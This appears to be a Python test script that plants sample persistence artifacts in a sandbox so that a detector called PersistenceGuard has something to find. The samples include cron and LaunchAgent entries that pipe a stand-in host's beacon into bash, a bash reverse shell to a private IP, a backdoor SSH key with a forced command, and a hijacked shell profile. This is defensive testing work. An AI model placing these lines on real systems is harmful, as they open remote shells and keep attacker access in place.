#!/usr/bin/env python3
"""Trigger Pack: PersistenceGuard — Exercise 5 silent persistence probes.

Targeted probes:
    1. CronJobPersistenceProbe — @reboot cron entry
    2. SSHKeyBackdoorProbe — new authorized_keys entry
    3. ShellProfileHijackProbe — backdoored .bashrc/.zshrc
    4. BrowserExtensionPersistenceProbe — fake extension manifest
    5. HiddenFilePersistenceProbe — hidden executable file
    6. StartupFolderLoginItemProbe — login item creation
    7. LaunchAgentDaemonProbe — suspicious LaunchAgent plist

All actions use sandboxed paths (/tmp/eoa_persistence_sandbox/) and are self-cleaning.
Run with --dry-run to preview without executing.
"""

from __future__ import annotations

import argparse
import json
import os
import shutil
import stat
import time

SANDBOX = "/tmp/eoa_persistence_sandbox"


def log(msg: str) -> None:
    print(f"  [PERSIST] {msg}")


def setup_sandbox() -> None:
    dirs = [
        SANDBOX,
        f"{SANDBOX}/home/eoa_user/.ssh",
        f"{SANDBOX}/home/eoa_user/.config/google-chrome/Default/Extensions/eoa_ext",
        f"{SANDBOX}/var/spool/cron/crontabs",
        f"{SANDBOX}/Library/LaunchAgents",
        f"{SANDBOX}/Library/LaunchDaemons",
        f"{SANDBOX}/home/eoa_user",
    ]
    for d in dirs:
        os.makedirs(d, exist_ok=True)
    log(f"Sandbox created: {SANDBOX}")


def cleanup_sandbox() -> None:
    if os.path.exists(SANDBOX):
        shutil.rmtree(SANDBOX, ignore_errors=True)
        log(f"Sandbox cleaned: {SANDBOX}")


# ── Trigger 1: CronJobPersistenceProbe ────────────────────────────────────

def trigger_cron_persistence(dry_run: bool = False) -> None:
    """Create @reboot cron entry (in sandbox)."""
    log("Trigger: CronJobPersistenceProbe")
    path = f"{SANDBOX}/var/spool/cron/crontabs/eoa_user"

    content = """\
# EOA trigger — suspicious cron entry
@reboot /tmp/eoa_backdoor.sh
*/5 * * * * curl -s http://evil.test/beacon | bash
"""

    if dry_run:
        log(f"  [DRY-RUN] Would create crontab: {path}")
        return

    with open(path, "w") as f:
        f.write(content)
    log(f"  Created crontab: {path}")


# ── Trigger 2: SSHKeyBackdoorProbe ────────────────────────────────────────

def trigger_ssh_key_backdoor(dry_run: bool = False) -> None:
    """Add unauthorized SSH key to authorized_keys (in sandbox)."""
    log("Trigger: SSHKeyBackdoorProbe")
    path = f"{SANDBOX}/home/eoa_user/.ssh/authorized_keys"

    content = """\
# Existing legitimate key
ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQ... legitimate@user
# EOA trigger — attacker backdoor key
ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQC+backdoor+key... attacker@evil
# Forced command backdoor
command="/tmp/exfil.sh" ssh-rsa AAAAB3NzaC1yc2EAAA... forced@cmd
"""

    if dry_run:
        log(f"  [DRY-RUN] Would create authorized_keys: {path}")
        return

    with open(path, "w") as f:
        f.write(content)
    os.chmod(path, 0o600)
    log(f"  Created authorized_keys with backdoor: {path}")


# ── Trigger 3: ShellProfileHijackProbe ────────────────────────────────────

def trigger_shell_profile_hijack(dry_run: bool = False) -> None:
    """Create .bashrc and .zshrc with suspicious patterns (in sandbox)."""
    log("Trigger: ShellProfileHijackProbe")

    profiles = {
        f"{SANDBOX}/home/eoa_user/.bashrc": """\
# Normal bashrc content
export PATH=$PATH:/usr/local/bin

# EOA trigger — suspicious eval pattern
eval "$(curl -s http://evil.test/payload)"

# Reverse shell pattern
bash -i >& /dev/tcp/10.99.99.99/4444 0>&1 &
""",
        f"{SANDBOX}/home/eoa_user/.zshrc": """\
# Normal zshrc
autoload -Uz compinit && compinit

# EOA trigger — PATH hijack
export PATH=/tmp/eoa_hijack:$PATH

# Python one-liner backdoor
python3 -c 'import socket,subprocess; s=socket.socket()' &
""",
    }

    for path, content in profiles.items():
        if dry_run:
            log(f"  [DRY-RUN] Would create: {path}")
        else:
            with open(path, "w") as f:
                f.write(content)
            log(f"  Created hijacked profile: {path}")


# ── Trigger 4: BrowserExtensionPersistenceProbe ──────────────────────────

def trigger_browser_extension(dry_run: bool = False) -> None:
    """Create fake Chrome extension manifest with dangerous permissions."""
    log("Trigger: BrowserExtensionPersistenceProbe")
    path = f"{SANDBOX}/home/eoa_user/.config/google-chrome/Default/Extensions/eoa_ext/manifest.json"

    manifest = {
        "manifest_version": 3,
        "name": "EOA Test Extension",
        "version": "1.0",
        "permissions": [
            "tabs",
            "webRequest",
            "webRequestBlocking",
            "<all_urls>",
            "cookies",
            "storage",
        ],
        "background": {
            "service_worker": "background.js",
        },
    }

    if dry_run:
        log(f"  [DRY-RUN] Would create extension manifest: {path}")
        return

    with open(path, "w") as f:
        json.dump(manifest, f, indent=2)
    log(f"  Created extension manifest: {path}")


# ── Trigger 5: HiddenFilePersistenceProbe ────────────────────────────────

def trigger_hidden_file(dry_run: bool = False) -> None:
    """Create hidden executable files (dot-prefixed) in sandbox."""
    log("Trigger: HiddenFilePersistenceProbe")

    files = [
        f"{SANDBOX}/home/eoa_user/.eoa_backdoor",
        f"{SANDBOX}/home/eoa_user/.config/.eoa_loader",
    ]

    for path in files:
        if dry_run:
            log(f"  [DRY-RUN] Would create: {path}")
        else:
            os.makedirs(os.path.dirname(path), exist_ok=True)
            with open(path, "w") as f:
                f.write("#!/bin/bash\necho eoa_hidden_test\n")
            os.chmod(path, 0o755)
            log(f"  Created hidden executable: {path}")


# ── Trigger 6: StartupFolderLoginItemProbe ───────────────────────────────

def trigger_startup_item(dry_run: bool = False) -> None:
    """Create a Login Item plist (macOS sandbox)."""
    log("Trigger: StartupFolderLoginItemProbe")
    path = f"{SANDBOX}/Library/LaunchAgents/com.eoa.startup.plist"

    plist = """\
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
    <key>Label</key>
    <string>com.eoa.startup</string>
    <key>ProgramArguments</key>
    <array>
        <string>/bin/bash</string>
        <string>-c</string>
        <string>curl -s http://evil.test/beacon | bash</string>
    </array>
    <key>RunAtLoad</key>
    <true/>
    <key>KeepAlive</key>
    <true/>
</dict>
</plist>
"""

    if dry_run:
        log(f"  [DRY-RUN] Would create startup item: {path}")
        return

    with open(path, "w") as f:
        f.write(plist)
    log(f"  Created startup item: {path}")


# ── Trigger 7: LaunchAgentDaemonProbe ────────────────────────────────────

def trigger_launch_daemon(dry_run: bool = False) -> None:
    """Create a suspicious LaunchDaemon plist (sandbox)."""
    log("Trigger: LaunchAgentDaemonProbe")
    path = f"{SANDBOX}/Library/LaunchDaemons/com.eoa.daemon.plist"

    plist = """\
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
    <key>Label</key>
    <string>com.eoa.daemon</string>
    <key>ProgramArguments</key>
    <array>
        <string>/usr/bin/python3</string>
        <string>-c</string>
        <string>import socket,subprocess,os; os.dup2(1,2)</string>
    </array>
    <key>RunAtLoad</key>
    <true/>
</dict>
</plist>
"""

    if dry_run:
        log(f"  [DRY-RUN] Would create LaunchDaemon: {path}")
        return

    with open(path, "w") as f:
        f.write(plist)
    log(f"  Created suspicious LaunchDaemon: {path}")


def main() -> None:
    parser = argparse.ArgumentParser(description="Trigger Pack: PersistenceGuard probes")
    parser.add_argument("--dry-run", action="store_true", help="Preview without executing")
    args = parser.parse_args()

    print("\n═══ PersistenceGuard Trigger Pack ═══")
    setup_sandbox()

    try:
        trigger_cron_persistence(args.dry_run)
        trigger_ssh_key_backdoor(args.dry_run)
        trigger_shell_profile_hijack(args.dry_run)
        trigger_browser_extension(args.dry_run)
        trigger_hidden_file(args.dry_run)
        trigger_startup_item(args.dry_run)
        trigger_launch_daemon(args.dry_run)
    finally:
        cleanup_sandbox()

    print("═══ PersistenceGuard triggers complete ═══\n")


if __name__ == "__main__":
    main()
